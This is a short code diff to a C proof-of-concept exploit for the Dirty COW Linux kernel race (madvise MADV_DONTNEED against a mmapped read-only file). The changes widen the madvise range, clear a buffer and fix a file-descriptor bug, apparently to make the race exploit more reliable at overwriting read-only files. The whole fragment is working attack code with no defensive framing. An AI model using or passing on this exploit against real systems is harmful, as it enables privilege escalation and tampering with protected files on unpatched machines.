@@ -40,7 +40,7 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
 > This is achieved by racing the madvise(MADV_DONTNEED) system call
 > while having the page of the executable mmapped in memory.
 */
-    c+=madvise(map,100,MADV_DONTNEED);
+    c+=madvise(map,10000,MADV_DONTNEED);
   }
   printf("madvise %d\n\n",c);
 }
@@ -83,7 +83,8 @@ You have to open the file in read only mode.
   fstat(f,&st);
   name=argv[1];
 
-  f=open(argv[2],O_RDONLY);
+  memset(data, 0, 65535);
+  f1=open(argv[2],O_RDONLY);
   fstat(f1,&st1);
   read(f1, data, st1.st_size);
   close(f1);
